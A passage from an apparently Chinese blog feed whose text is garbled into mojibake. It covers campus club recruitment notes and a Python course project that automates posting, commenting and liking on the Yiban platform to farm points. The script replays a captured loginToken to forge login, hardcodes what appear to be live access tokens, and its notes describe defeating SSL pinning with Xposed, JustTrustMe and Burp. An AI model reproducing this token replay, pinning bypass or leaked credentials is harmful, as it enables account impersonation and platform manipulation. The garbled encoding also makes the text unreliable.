ç½‘ç»œä¿¡æ¯å®‰å…¨çŸ¥è¯†ä¸ºåŸºç¡€ï¼Œä»¥æŠ€æœ¯ç»´æŠ¤ä¿¡æ¯å®‰å…¨ä¸ºå®—æ—¨çš„åŸåˆ™ï¼ŒåŠªåŠ›æå‡è‡ªèº«æŠ€èƒ½ï¼Œå¢å¼ºå›¢é˜Ÿåä½œèƒ½åŠ›ï¼Œå¯»æ±‚é€‚åˆè‡ªå·±çš„å‘å±•æ–¹å‘ã€‚</p><p>ç¤¾å›¢ä¼šé€šè¿‡ç»„ç»‡æˆå‘˜å‚ä¸å„ç±»ä¿¡æ¯å®‰å…¨ç«èµ›æ¥è·å–å®è·µç»éªŒï¼Œå¹¶é¼“åŠ±æˆå‘˜åˆ©ç”¨æ‰€å­¦ä¸“ä¸šçŸ¥è¯†è¿›è¡Œæ·±å±‚æ¬¡çš„å®‰å…¨ç ”ç©¶ã€‚</p><p>æ— è®ºä½ å¯¹è¿™ä¸ªé¢†åŸŸæ˜¯åˆçª¥å ‚å¥¥äº¦æˆ–æ˜¯ä¸ç”šäº†äº†ï¼Œåªè¦ä½ å¯¹å®‰å…¨å……æ»¡å…´è¶£ï¼Œæ»¡æ€€çƒ­æƒ…å’Œæ±‚çŸ¥ï¼Œéƒ½å¯ä»¥åœ¨ä¿¡å®‰å°ç»„æ‰¾åˆ°å±äºè‡ªå·±çš„å®‰å…¨å°å¤©åœ°ï¼</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š615072802</p></blockquote><h3 id="ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿ"><a href="#ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿ" class="headerlink" title="ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿ"></a>ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿ</h3><p>ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿï¼ˆPangolinï¼‰ï¼Œåˆç§°ç©¿å±±ç”²ï¼Œå–å…¶å¯æ”»å¯å®ˆï¼Œæ”»å®ˆå…¼å¤‡ä¹‹æ„ã€‚</p><p>ç©¿å±±ç”²å®‰å…¨çºµé˜Ÿç”±ä¸å‹‡æ•™æˆæŒ‡å¯¼è´Ÿè´£ï¼Œä¸»æ”»ä¿¡æ¯å®‰å…¨æ–¹é¢ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº æ¸—é€æµ‹è¯•ã€ç½‘ç»œæ”»é˜²ã€ç®—æ³•ç ”ç©¶ã€é€†å‘ç ´è§£ã€äºŒè¿›åˆ¶å®‰å…¨ï¼Œå·¥æ§å®‰å…¨ï¼Œç§»åŠ¨å®‰å…¨ã€‚</p><p>æˆ‘ä»¬å›¢é˜Ÿåœ¨æŒ‡å¯¼è€å¸ˆä¸å‹‡æ•™æˆçš„å¸®åŠ©å’Œå­¦é™¢çš„æ”¯æŒä¸‹ï¼Œè”åˆåˆå¤©æ™ºæ±‡ä¿¡æ¯æŠ€æœ¯æœ‰é™å…¬å¸ã€ç»¿ç›Ÿç§‘æŠ€ä»¥åŠæ·±ä¿¡æœç§‘æŠ€ç­‰çŸ¥åç½‘ç»œå®‰å…¨å…¬å¸ï¼Œä¸¾åŠäº†â€˜åˆå¤©æ¯â€™ã€â€˜ç»¿ç›Ÿæ¯â€™ã€â€˜æ·±ä¿¡æœæ¯â€™ç­‰å¤šä¸ª CTF å¤ºæ——èµ›å¹¶å–å¾—ä¼˜å¼‚çš„æˆç»©ã€‚æ›´æœ‰ä¼˜ç§€çš„å­¦é•¿å­¦å§å»åˆ° 360 ç­‰å¤§ä¼ä¸šå®ä¹ å·¥ä½œã€‚</p><p>æœ¬å›¢é˜Ÿå­¦ä¹ æ°›å›´æµ“åšï¼Œé£æ°”å¼€æ”¾è‡ªç”±ï¼Œå€¡å¯¼æ¢ç´¢ä¸å®è·µç²¾ç¥ã€‚ç©¿å±±ç”²çš„åˆ›ç«‹ï¼Œå°±æ˜¯ä¸ºçƒ­çˆ±ä¿¡æ¯å®‰å…¨çš„â€œé“å‹â€ä»¬æä¾›ä¸€ä¸ªå­¦ä¹ äº¤æµçš„å¹³å°ï¼Œå…±åŒæ¢ç´¢â€œä¿¡å®‰ä¹‹é“â€ï¼</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š836214373</p></blockquote><h3 id="å¤©æ¶¯ç¤¾åŒºäººæ‰åŸ¹å…»åŸºåœ°"><a href="#å¤©æ¶¯ç¤¾åŒºäººæ‰åŸ¹å…»åŸºåœ°" class="headerlink" title="å¤©æ¶¯ç¤¾åŒºäººæ‰åŸ¹å…»åŸºåœ°"></a>å¤©æ¶¯ç¤¾åŒºäººæ‰åŸ¹å…»åŸºåœ°</h3><p>å¤©æ¶¯ç¤¾åŒºäººæ‰åŸ¹å…»åŸºåœ°åˆ›å»ºäº 2010  å¹´çš„æ ¡çº§å¤§å­¦ç”Ÿåˆ›æ–°å®è·µåŸºåœ°ï¼Œç”±çŸ¥åäº’è”ç½‘ä¼ä¸šå¤©æ¶¯ç¤¾åŒºä¸æ¡‚ç”µçš„æ ¡ä¼åˆä½œè€Œæˆç«‹çš„å­¦ç”ŸåŸ¹å…»åŸºåœ°å‘å±•è€Œæ¥ã€‚</p><p>åŸºåœ°é¢å‘å…¨æ ¡å­¦ç”Ÿï¼Œä»¥â€œåŸ¹å…»å…·æœ‰åˆ›æ–°æ„è¯†å’Œä¼˜ç§€å¼€å‘èƒ½åŠ›çš„åº”ç”¨å‹è®¡ç®—æœºæŠ€æœ¯äººæ‰â€ä¸ºå®—æ—¨ï¼Œä»¥é¡¹ç›®å’Œä»»åŠ¡é©±åŠ¨ä¸ºä¸»è¦å½¢å¼ï¼Œé€šè¿‡å¼€å±•æŠ€æœ¯äº¤æµä¸åŸ¹è®­ã€ç»„ç»‡ç”Ÿäº§å®ä¹ ä¸å®è·µã€å‚åŠ ç›¸å…³å­¦ç§‘ç«èµ›ç­‰æ´»åŠ¨ï¼ŒåŸ¹å…»èƒ½å°†ç†è®ºä¸å®è·µç›¸ç»“åˆï¼Œå…·æœ‰è¾ƒé«˜è®¾è®¡ä¸å¼€å‘èƒ½åŠ›ï¼Œå…·å¤‡è‰¯å¥½å›¢é˜Ÿåä½œç²¾ç¥çš„ä¼˜ç§€äººæ‰ã€‚</p><p>ä»æœ¬åŸºåœ°èµ°å‡ºäº†å¤§é‡ä¼˜ç§€äººæ‰ï¼Œå¤šåæˆå‘˜æ¯•ä¸šåè¿›å…¥åä¸ºã€äº¬ä¸œç­‰çŸ¥åä¼ä¸šå°±ä¸šæˆ–å°±è¯»ç ”ç©¶ç”Ÿã€‚</p><blockquote><p>æ‹›æ–°ç¾¤å·ï¼š946146047</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç”Ÿæ´»æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç”Ÿæ´»æ‚è®°&amp;æ–°ç”Ÿå…¥å­¦ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ˜“ç­è‡ªåŠ¨åˆ·ç½‘è–ªç³»ç»Ÿ</title>
      <link href="/posts/1206/"/>
      <url>/posts/1206/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>Python è¯¾æœ€åçš„å¤§ä½œä¸šï¼Œè·Ÿå¤§å“¥ä»¬ä¸€èµ·å†™è¿™ä¸ªå°ç©æ„ï¼Œå› ä¸ºå­¦é™¢å¥½åƒå¾ˆå–œæ¬¢åˆ·è¿™äº›ä¸œè¥¿ï¼Œæ€»ä½“æ¥è¯´æŒºç®€å•çš„</p><p>åˆ†åˆ°æˆ‘çš„æ¨¡å—åˆšåˆšå¥½éœ€è¦æ‰‹æœºæŠ“åŒ…ï¼Œç½‘é¡µç«¯æ˜“ç­ç™»é™†è¿›å»æ²¡æœ‰å‘åŠ¨æ€çš„æ¨¡å—äº†ï¼Œæ¨¡å—åœ¨ç»´æŠ¤</p><p>2022.11.30ï¼šä¸çŸ¥é“è¿™ç¯‡æ–‡ç« é‡Œé¢çš„è„šæœ¬è¿˜æœ‰æ²¡æœ‰ç”¨ï¼Œå¦‚æœæœ‰éœ€è¦å°±è‡ªå·±è¯•è¯•è„šæœ¬è¿˜èƒ½ä¸èƒ½ç”¨å§</p></blockquote><h1 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@Time : 2021/5/5</span></span><br><span class="line"><span class="string">@Author : C1everF0x</span></span><br><span class="line"><span class="string">@File : dongtai</span></span><br><span class="line"><span class="string">@Description : </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ç™»å½•æ¨¡å—å…¶å®æ²¡æœ‰çœŸæ­£å®ç°ï¼Œç½‘é¡µç«¯ç™»å½•å·²ç»èƒ½é€šè¿‡é€†å‘åˆ†æ login.js æ–‡ä»¶æ¥è·å–æ˜“ç­å¯¹å¯†ç åœ¨å‰ç«¯çš„åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥çœŸæ­£å®ç°æ¨¡æ‹Ÿç™»å½•</span></span><br><span class="line"><span class="string">    appç«¯æ— æ³•é€šè¿‡æŠ“åŒ…æˆ–åˆ†ææ¥å£åœ°å€æ¥æ‰¾åˆ°åŠ å¯†æ–¹å¼</span></span><br><span class="line"><span class="string">    ç¬¬ä¸€æ¬¡è¾“å…¥å¯†ç ç™»é™†è¿‡åï¼Œappä¼šå°† loginToken åµŒå…¥åˆ° app é‡Œï¼Œä¸‹æ¬¡æ‰“å¼€ä¼šæå–æ‹¼æ¥åˆ° autologin æ¥å£çš„ urlä¸­</span></span><br><span class="line"><span class="string">    ç›®å‰èƒ½æƒ³åˆ°çš„ app ç«¯å®ç°çœŸæ­£æ¨¡æ‹Ÿç™»å½•ä¸¤ç§æ–¹æ³•ï¼š</span></span><br><span class="line"><span class="string">    1ã€app ç«¯åœ¨ç™»å½•æ—¶å€™å¯¹å¯†ç çš„åŠ å¯†æ˜¯åµŒåœ¨ app çš„æºç é‡Œï¼ŒçœŸè¦åšå¯ä»¥é€šè¿‡é€†å‘åˆ†æ app æºç ï¼Œæ‰¾åˆ°åŠ å¯†ä»£ç é€†å‘ç ´è§£</span></span><br><span class="line"><span class="string">    2ã€ä½¿ç”¨ç±»ä¼¼äº seleium çš„ appium æ¥å®ç°æ¨¡æ‹ŸçœŸæ­£çš„äººè¿›è¡Œç™»å½•ï¼Œå†ä»ä¸­æå–å‡º loginToken</span></span><br><span class="line"><span class="string">    ç›®å‰å®ç°åªèƒ½å¤Ÿæ˜¯æŠ“åŒ…æ‹¿ loginToken æ¥ç»™åˆ° autologin æ¥å£è¿›è¡Œä¼ªé€ ç™»å½•</span></span><br><span class="line"><span class="string">    2021.05.07</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&quot;https://mobile.yiban.cn/api/v3/passport/autologin?access_token=e3017321cf9cdae74e34061cf7adef4a&quot;</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url = url,headers = header)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># åˆ¤æ–­å¼‚å¸¸</span></span><br><span class="line">        r.encoding = r.apparent_encoding    <span class="comment"># è®¾ç½®ç¼–ç </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ç™»å½•æˆåŠŸ&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ç™»å½•å¤±è´¥&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DongTai</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,token,neirong_dongtai,neirong_pinglun</span>):   <span class="comment"># åˆå§‹åŒ–ç±»é‡Œé¢çš„ç§å¯†å±æ€§</span></span><br><span class="line">        self.__token = token</span><br><span class="line">        self.neirong_dongtai = neirong_dongtai</span><br><span class="line">        self.__dongtai_hao = <span class="literal">None</span></span><br><span class="line">        self.neirong_pinglun = neirong_pinglun</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">release</span>(<span class="params">self,neirong_dongtai</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        è‡ªåŠ¨å‘å¸ƒåŠ¨æ€ï¼ŒåŠ¨æ€å†…å®¹éœ€è¦è¿›è¡Œä¸€æ¬¡ url ç¼–ç </span></span><br><span class="line"><span class="string">        åŠ¨æ€å‘å¸ƒæˆåŠŸåä¼šè¿”å›ä¸€ä¸ª json ï¼Œé‡Œé¢æœ‰æ¯ä¸ªåŠ¨æ€ä¸“å±çš„ä¸€ä¸ªä¹ä½æ•°çš„å·ç </span></span><br><span class="line"><span class="string">        ä¹‹åå¯¹åŠ¨æ€è¿›è¡Œçš„ç‚¹èµã€è¯„è®ºæ“ä½œï¼Œéœ€è¦é€šè¿‡è¯¥å·ç å®šä½æ˜¯å“ªæ¡åŠ¨æ€</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/?access_token=&#x27;</span> + self.__token + <span class="string">&#x27;&amp;content=&#x27;</span> + urllib.parse.quote(neirong_dongtai) + <span class="string">&#x27;&amp;visibleScope=0&amp;artwork=0&amp;toUserIds=&amp;address=&amp;lat=&amp;lng=&amp;share=0&amp;shareTitle=&amp;shareUrl=&amp;shareContent=&amp;shareImage=&amp;shareSource=&amp;kind=1&amp;hiddenAddress=0&#x27;</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,headers = header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            response_json = r.text</span><br><span class="line">            re_response_json = re.findall(<span class="string">r&#x27;\d&#123;9&#125;&#x27;</span>,response_json)   <span class="comment"># æ­£åˆ™åŒ¹é…æå–åŠ¨æ€å·ç </span></span><br><span class="line">            self.__dongtai_hao = <span class="string">&#x27;&#x27;</span>.join(re_response_json)  <span class="comment"># èµ‹ç»™ç§æœ‰å˜é‡</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;å‘å¸ƒæˆåŠŸï¼Œè¯¥åŠ¨æ€ id ä¸º &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.__dongtai_hao)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;å‘å¸ƒå¤±è´¥&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¿”å› json æ ·ä¾‹ï¼ŒfeedId æ˜¯åŠ¨æ€å·ç </span></span><br><span class="line">        <span class="comment"># &#123;&quot;response&quot;: 100, &quot;message&quot;: &quot;\u8bf7\u6c42\u6210\u529f&quot;,</span></span><br><span class="line">        <span class="comment">#  &quot;data&quot;: &#123;&quot;feedId&quot;: 294594341, &quot;feedCheckinReward&quot;: null&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">give_good</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            è‡ªåŠ¨ç»™åŠ¨æ€ç‚¹èµ</span></span><br><span class="line"><span class="string">            :return:</span></span><br><span class="line"><span class="string">            &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/&#x27;</span> + self.__dongtai_hao + <span class="string">r&#x27;/ups?access_token=&#x27;</span> + self.__token</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ç‚¹èµæˆåŠŸ&#x27;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;ç‚¹èµå¤±è´¥&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">comments</span>(<span class="params">self,neirong_pinglun</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        è‡ªåŠ¨ç»™åŠ¨æ€è¯„è®ºï¼Œå†…å®¹éœ€è¦è¿›è¡Œä¸€æ¬¡ url ç¼–ç ï¼Œé€šè¿‡ä¹‹å‰å‘å¸ƒå­˜å…¥ç§æœ‰å˜é‡çš„åŠ¨æ€å·ç æ¥ç¡®å®šéœ€è¦è¯„è®ºå“ªæ¡åŠ¨æ€</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        url = <span class="string">r&#x27;https://mobile.yiban.cn/api/v3/feeds/&#x27;</span> + self.__dongtai_hao + <span class="string">&#x27;/comments?access_token=&#x27;</span> + self.__token + <span class="string">r&#x27;&amp;content=&#x27;</span> + urllib.parse.quote(neirong_pinglun) + <span class="string">r&#x27;&amp;toUserId=&amp;toCommentId=&#x27;</span></span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;YiBan/4.9.9 Mozilla/5.0 (Linux; Android 5.1.1; MI 9 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;loginToken&#x27;</span>: <span class="string">&#x27;e3017321cf9cdae74e34061cf7adef4a&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;AppVersion&#x27;</span>: <span class="string">&#x27;4.9.9&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=header)</span><br><span class="line">            r.raise_for_status()</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;è¯„è®ºæˆåŠŸï¼Œè¯„è®ºå†…å®¹ä¸º &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(neirong_pinglun)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;è¯„è®ºå¤±è´¥&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(login())</span><br><span class="line">    token = <span class="string">&#x27;e6262d37a192f6be11c159f4080326d9&#x27;</span></span><br><span class="line">    neirong_dongtai = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥åŠ¨æ€å†…å®¹ï¼š&#x27;</span>)</span><br><span class="line">    neirong_pinglun = <span class="built_in">input</span>(<span class="string">&#x27;è¯·è¾“å…¥è¯„è®ºå†…å®¹ï¼š&#x27;</span>)</span><br><span class="line">    dongtai = DongTai(token,neirong_dongtai,neirong_pinglun)    <span class="comment"># å®ä¾‹åŒ–åŠ¨æ€ç±»ï¼Œéœ€è¦æä¾› loginTokenï¼Œå‘å¸ƒåŠ¨æ€å†…å®¹å’Œè¯„è®ºå†…å®¹</span></span><br><span class="line">    <span class="built_in">print</span>(dongtai.release(neirong_dongtai))</span><br><span class="line">    <span class="built_in">print</span>(dongtai.comments(neirong_pinglun))</span><br><span class="line">    <span class="built_in">print</span>(dongtai.give_good())</span><br></pre></td></tr></table></figure><p>æœ€åç»“æœå¦‚å›¾ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509031647.png"></p><h1 id="æ•´ä½“æµç¨‹"><a href="#æ•´ä½“æµç¨‹" class="headerlink" title="æ•´ä½“æµç¨‹"></a>æ•´ä½“æµç¨‹</h1><ul><li><p>æµç¨‹å›¾å¦‚ä¸‹</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210509032901.png"></p></li></ul><h1 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h1><ul><li><p>ä½¿ç”¨ requests åº“ç¼–å†™çˆ¬è™«ç¨‹åºï¼Œå®ç°æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¿›è¡Œå‘å¸ƒåŠ¨æ€ã€è¯„è®ºåŠ¨æ€å’Œç‚¹èµåŠ¨æ€çš„åŠŸèƒ½</p></li><li><p>ä½¿ç”¨ re åº“å¯¹å‘å¸ƒåŠ¨æ€æˆåŠŸåçš„è¿”å›åŒ…è¿›è¡Œè§£æï¼Œæå–å‘å¸ƒæˆåŠŸçš„åŠ¨æ€çš„åŠ¨æ€å·ç </p></li><li><p>æ­å»ºå®‰å“è™šæ‹Ÿæœº + xposed æ¡†æ¶ + justTrustMe æ¨¡å—ï¼Œå› ä¸º app å¯ä»¥è‡ªå·±æ£€éªŒ SSL æ¡æ‰‹æ—¶æœåŠ¡å™¨è¿”å›çš„è¯ä¹¦æ˜¯å¦åˆæ³•ï¼Œâ€œSSL pinningâ€ æŠ€æœ¯æŒ‡åœ¨ app ä¸­åªä¿¡ä»»å›ºå®šçš„è¯ä¹¦å’Œå…¬é’¥ï¼Œå®‰å“ 7.0 ä»¥ä¸ŠæŠŠè¯ä¹¦åˆ†ä¸ºç³»ç»Ÿè¯ä¹¦å’Œç”¨æˆ·è¯ä¹¦ï¼Œæœ‰äº› app åªä¿¡ä»»ç³»ç»Ÿè¯ä¹¦ï¼ŒçœŸå®æ‰‹æœºæŠ“åŒ…ä¼šæç¤ºæ‰‹æœºæ²¡ç½‘ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ xposed æ¡†æ¶ + justTrustMe æ¨¡å—ï¼Œæ¥ hook æ‰æœ¬åœ°è¯ä¹¦å¼ºæ ¡éªŒçš„é€»è¾‘ï¼ŒåŒæ—¶å¯¼å…¥ burp 